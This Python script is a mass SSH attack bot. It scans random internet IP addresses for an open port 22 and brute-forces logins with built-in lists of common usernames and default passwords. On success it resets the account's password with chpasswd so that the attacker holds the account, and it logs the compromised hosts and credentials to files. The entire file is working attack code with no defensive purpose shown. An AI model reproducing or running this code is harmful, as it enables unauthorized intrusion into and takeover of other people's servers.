import socket
import threading
import random
import subprocess
import time

lock = threading.Lock()
vds = []
logs = []
run = True

def test():
	global vds, logs
	while True:
		ip = str(random.randint(1, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))
		if ip.startswith("128") or ip.startswith("192.168") or ip.startswith("255.255.255") or ip.startswith("224.0.0") or ip[:3] in list(range(224, 240)):
			pass
		else:
			break
	s = socket.socket()
	s.settimeout(0.45)
	try:
		s.connect((ip, 22))
		print(ip, 22)
		with lock:
			logs.append(f"Open VDS Port: {ip}:22 (Hacking...)")
		users = ['root', 'admin', 'user', 'test', 'guest', 'ubuntu', 'kali', 'john', 'jane', 'smith', 'Admin', 'Admin123', 'Admin321', 'windows', 'server', 'username', 'pi', 'oracle', 'mysql', 'ftp', 'postgres', 'support', 'apache', 'backup', 'tomcat', 'raspberry', 'default', 'operator', 'superuser', 'administrator', 'demo', 'infosys', 'service', 'remote', 'temp', 'git', 'jenkins', 'vagrant', 'docker', 'ansible', 'nagios', 'monitor', 'centos', 'debian', 'redhat', 'ec2-user', 'sysadmin', 'webadmin', 'maintenance', 'Administrator']
		passwords = ['admin', 'admin123', '1234', '12345', '123456', '1234567', '12345678', '123456789', 'password', 'pass', 'root', 'toor', 'guest', 'test', 'ubuntu', 'kali', 'raspberry', 'letmein', '123', 'qwerty', 'abc123', '123123', 'user', 'user123', 'administrator', 'adminadmin', 'support', 'changeme', 'default', 'login', 'password1', 'welcome', 'temp', 'server', '123qwe', 'qwe123', '1q2w3e', 'p4ssw0rd', '1234qwer', 'ftp', 'postgres', 'oracle', 'docker', 'jenkins', 'vagrant', 'ansible', 'nagios', 'sysadmin', 'webadmin', '1234567890', '0000', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999', 'root123', 'pass123', 'rootroot', 'test123', 'guest123', 'admin1', 'admin2', 'admin3', 'admin4', 'superuser', 'master', 'server123', 'backup', 'oracle123', 'postgres123', 'ftp123', 'temp123', 'welcome123', 'changeme123', 'default123', 'admin123', 'pass123', 'root123', 'user123', '1qaz2wsx', 'zxcvbnm', 'mypass', 'mypassword', 'rootpass', 'adminpass', '123abc', '321cba', 'abc321', 'admin321', 'pass321', 'root321', 'letmein123', 'qwerty123', 'adminpassword', 'rootpassword', 'userpassword', 'guestpassword', 'testpassword', 'welcome1', 'welcome2', 'welcome3', 'server1', 'server2', 'server3', 'temp1', 'temp2', 'temp3', 'docker123', 'jenkins123', 'vagrant123', 'ansible123', 'nagios123', 'webadmin123', 'sysadmin123', 'adminadmin123', 'superuser123', 'changeme1', 'changeme2', 'changeme3', 'roottoor', 'toorroot', '1q2w3e4r', 'password123', 'password321', 'passw0rd', 'passw0rd123', 'p4ssword', 'p4ssword123', 'welcome123', 'rootserver', 'adminserver', 'userserver', 'guestserver', 'testserver', 'server123', 'server321', 'passserver', 'passwordserver', 'qwerty123', 'qazwsx', 'qazwsx123', 'zaq12wsx', 'zxcvbnm123', 'asdfgh', 'asdfgh123', 'mypc', 'mypc123', 'mypassword123', 'rootlogin', 'adminlogin', 'userlogin', 'guestlogin', 'testlogin', 'ubuntu123', 'kali123', 'raspberry123', 'pi123', 'oracle123', 'postgres123', 'ftp123', 'docker123', 'jenkins123', 'vagrant123', 'ansible123', 'nagios123', 'webadmin123', 'sysadmin123', 'defaultpass', 'changepass', 'rootme', 'letmein123', 'welcome1', 'welcome2', 'welcome3', 'adminserver', 'adminserver123', 'rootserver', 'rootserver123', 'serverpass', 'passwordserver', 'adminaccess', 'rootaccess', 'useraccess', 'guestaccess', 'testaccess', 'remote', 'remote123', 'remotepass', 'remotepassword', '123remote', 'ssh', 'ssh123', 'sshpass', 'sshpassword', 'sshaccess', 'sshlogin']
		targetpwd = "".join([random.choice(list("qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")) for _ in range(12)])
		ok = False
		for user in users:
			if ok:
				break
			ss = subprocess.run(f"ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o BatchMode=yes -p 22 {user}@{ip} 'echo \"{user}:{targetpwd}\" | chpasswd'", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, input=user+"\n")
			out = ss.stdout+ss.stderr
			if "Permission denied" not in out and "timed out" not in out and "Connection closed" not in out:
				if "not changed" in out:
					with lock:
						logs.append(f"{ip}:22 hacked account (password cannot changed). SSH username: {user}")
						vds.append([out, ip, "22", "not changed", user])
					ok = True
				else:
					with lock:
						logs.append(f"{ip}:22 hacked account (password changed). SSH username: {user} SSH New Password: {targetpwd}")
						vds.append([out, ip, "22", "changed", user, targetpwd])
					ok = True
		for user in users:
			if ok:
				break
			for password in passwords:
				if ok:
					break
				ss = subprocess.run(f"sshpass -p {password} ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o BatchMode=yes -p 22 {user}@{ip} 'echo \"{user}:{targetpwd}\" | sudo -S chpasswd'", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, input=password+"\n")
				out = ss.stdout+ss.stderr
				if "Permission denied" not in out and "timed out" not in out and "Connection closed" not in out:
					if "not changed" in out:
						with lock:
							logs.append(f"{ip}:22 hacked account (password cannot changed). SSH username: {user} SSH Password: {password}")
							vds.append([out, ip, "22", "not changed", user, password])
						ok = True
					else:
						with lock:
							logs.append(f"{ip}:22 hacked account (password changed). SSH username: {user} SSH New Password: {targetpwd} SSH Old Password: {password}")
							vds.append([out, ip, "22", "changed", user, targetpwd, password])
						ok = True
	except:
		pass
	s.close()

def bot():
	global run
	while run:
		ts = []
		for _ in range(4):
			t = threading.Thread(target=test)
			t.start()
			ts.append(t)
			time.sleep(0)
		for t in ts:
			t.join()
			time.sleep(0)
import json
for _ in range(8):
	threading.Thread(target=bot).start()
try:
	while run:
		lf = open("v4d_logs.txt", "w")
		ff = open("v4d_find.txt", "w")
		lf.write("\n".join(logs));lf.flush()
		ff.write(json.dumps({"vds": vds}, indent=4, default=repr));ff.flush()
		lf.close()
		ff.close()
		time.sleep(1)
except Exception as e:
	print(e)
	run = Fals